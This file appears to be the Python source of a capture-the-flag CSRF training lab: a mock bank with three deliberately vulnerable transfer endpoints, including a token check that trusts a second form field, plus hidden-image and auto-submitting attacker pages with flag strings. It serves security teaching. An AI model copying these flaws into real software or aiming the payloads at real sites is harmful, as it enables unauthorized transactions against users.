import os
import secrets
from flask import Flask, request, session, render_template_string, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "csrf-lab-dev-key")
# Explicitly permissive cookie settings: this lab simulates a site that
# either never set SameSite or deliberately relaxed it for cross-domain
# integrations - exactly the condition under which CSRF matters.
app.config["SESSION_COOKIE_SAMESITE"] = None
app.config["SESSION_COOKIE_SECURE"] = False

FLAG1 = os.environ.get("FLAG1", "CTF{csrf_l1_g3t_b4s3d_tr4nsf3r}")
FLAG2 = os.environ.get("FLAG2", "CTF{csrf_l2_p0st_n0_t0k3n_ch3ck}")
FLAG3 = os.environ.get("FLAG3", "CTF{csrf_l3_t0k3n_n0t_b0und_t0_s3ss10n}")

accounts = {}  # username -> {balance, history}


def get_user():
    if "user" not in session:
        session["user"] = "victim_" + secrets.token_hex(3)
        accounts[session["user"]] = {"balance": 1000, "history": [], "l1_done": False, "l2_done": False}
    u = session["user"]
    accounts.setdefault(u, {"balance": 1000, "history": [], "l1_done": False, "l2_done": False})
    return u


HOME = """<!doctype html><html><head><title>CSRF Lab — SecureBank</title>
<style>body{font-family:monospace;background:#0d1117;color:#c9d1d9;max-width:760px;margin:40px auto}
a{color:#58a6ff}code{background:#161b22;padding:2px 6px;border-radius:4px}</style></head>
<body><h1>SecureBank — CSRF Lab</h1>
<p>You are logged in as <b>{{ user }}</b>, balance: <b>{{ balance }}</b> coins.</p>
<ul>
<li><a href="/level1">Level 1</a> — GET-based transfer, no protection</li>
<li><a href="/level2">Level 2</a> — POST-based transfer, no CSRF token</li>
<li><a href="/level3">Level 3</a> — has a token field, but it's not checked properly</li>
</ul>
<p>Open the matching page under <code>/exploit/</code> in a NEW tab/window while logged in here
to simulate visiting an attacker's site as this victim.</p>
<p><a href="/reset">Reset my account</a></p>
</body></html>"""


@app.route("/")
def home():
    u = get_user()
    return render_template_string(HOME, user=u, balance=accounts[u]["balance"])


@app.route("/reset")
def reset():
    u = get_user()
    accounts[u] = {"balance": 1000, "history": [], "l1_done": False, "l2_done": False}
    return jsonify(message="reset", balance=1000)


# ---------------- LEVEL 1: GET-based transfer ----------------
LEVEL1 = """<!doctype html><html><body style="font-family:monospace;background:#0d1117;color:#c9d1d9;max-width:700px;margin:20px auto">
<h2>Transfer Funds (GET, no protection)</h2>
<form method="GET" action="/level1/transfer">
To: <input name="to" value="friend"><br><br>
Amount: <input name="amount" value="10"><br><br>
<button>Send</button>
</form>
<p>Balance: {{ balance }} | History: {{ history }}</p>
</body></html>"""

@app.route("/level1")
def level1():
    u = get_user()
    return render_template_string(LEVEL1, balance=accounts[u]["balance"], history=accounts[u]["history"])

@app.route("/level1/transfer", methods=["GET"])
def level1_transfer():
    u = get_user()
    to = request.args.get("to", "")
    try:
        amount = int(request.args.get("amount", 0))
    except ValueError:
        amount = 0
    accounts[u]["balance"] -= amount
    accounts[u]["history"].append(f"sent {amount} to {to}")
    if to == "attacker" and amount >= 500:
        accounts[u]["l1_done"] = True
    return jsonify(message="transferred", to=to, amount=amount,
                   balance=accounts[u]["balance"],
                   flag=FLAG1 if accounts[u]["l1_done"] else None)


# ---------------- LEVEL 2: POST-based transfer, no token ----------------
LEVEL2 = """<!doctype html><html><body style="font-family:monospace;background:#0d1117;color:#c9d1d9;max-width:700px;margin:20px auto">
<h2>Transfer Funds (POST, no CSRF token)</h2>
<form method="POST" action="/level2/transfer">
To: <input name="to" value="friend"><br><br>
Amount: <input name="amount" value="10"><br><br>
<button>Send</button>
</form>
<p>Balance: {{ balance }} | History: {{ history }}</p>
</body></html>"""

@app.route("/level2")
def level2():
    u = get_user()
    return render_template_string(LEVEL2, balance=accounts[u]["balance"], history=accounts[u]["history"])

@app.route("/level2/transfer", methods=["POST"])
def level2_transfer():
    u = get_user()
    to = request.form.get("to", "")
    try:
        amount = int(request.form.get("amount", 0))
    except ValueError:
        amount = 0
    accounts[u]["balance"] -= amount
    accounts[u]["history"].append(f"sent {amount} to {to}")
    if to == "attacker" and amount >= 500:
        accounts[u]["l2_done"] = True
    return jsonify(message="transferred", to=to, amount=amount,
                   balance=accounts[u]["balance"],
                   flag=FLAG2 if accounts[u]["l2_done"] else None)


# ---------------- LEVEL 3: token present but validated against itself ----------------
LEVEL3 = """<!doctype html><html><body style="font-family:monospace;background:#0d1117;color:#c9d1d9;max-width:700px;margin:20px auto">
<h2>Transfer Funds (CSRF token - but is it checked right?)</h2>
<form method="POST" action="/level3/transfer">
To: <input name="to" value="friend"><br><br>
Amount: <input name="amount" value="10"><br><br>
<input type="hidden" name="csrf_token" value="{{ token }}">
<input type="hidden" name="csrf_token_confirm" value="{{ token }}">
<button>Send</button>
</form>
<p>Balance: {{ balance }}</p>
</body></html>"""

@app.route("/level3")
def level3():
    u = get_user()
    session["csrf_token"] = secrets.token_hex(16)
    return render_template_string(LEVEL3, balance=accounts[u]["balance"], token=session["csrf_token"])

@app.route("/level3/transfer", methods=["POST"])
def level3_transfer():
    u = get_user()
    # VULN: compares the submitted token against ANOTHER submitted field
    # instead of the value stored server-side in the session.
    token = request.form.get("csrf_token", "")
    confirm = request.form.get("csrf_token_confirm", "")
    if not token or token != confirm:
        return jsonify(error="CSRF token mismatch"), 403
    to = request.form.get("to", "")
    try:
        amount = int(request.form.get("amount", 0))
    except ValueError:
        amount = 0
    accounts[u]["balance"] -= amount
    flag = FLAG3 if (to == "attacker" and amount >= 500) else None
    return jsonify(message="transferred", to=to, amount=amount, balance=accounts[u]["balance"], flag=flag)


# ---------------- Attacker exploit pages ----------------
EXPLOIT1 = """<!doctype html><html><body>
<h3>Totally legit page</h3>
<p>Loading your free prize...</p>
<img src="http://localhost:5000/level1/transfer?to=attacker&amount=500" style="display:none">
</body></html>"""

EXPLOIT2 = """<!doctype html><html><body onload="document.forms[0].submit()">
<h3>Totally legit page</h3>
<form action="http://localhost:5000/level2/transfer" method="POST">
<input type="hidden" name="to" value="attacker">
<input type="hidden" name="amount" value="500">
</form>
</body></html>"""

EXPLOIT3 = """<!doctype html><html><body onload="document.forms[0].submit()">
<h3>Totally legit page</h3>
<form action="http://localhost:5000/level3/transfer" method="POST">
<input type="hidden" name="to" value="attacker">
<input type="hidden" name="amount" value="500">
<input type="hidden" name="csrf_token" value="anything">
<input type="hidden" name="csrf_token_confirm" value="anything">
</form>
</body></html>"""

@app.route("/exploit/level1.html")
def exploit1():
    return EXPLOIT1

@app.route("/exploit/level2.html")
def exploit2():
    return EXPLOIT2

@app.route("/exploit/level3.html")
def exploit3():
    return EXPLOIT3


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
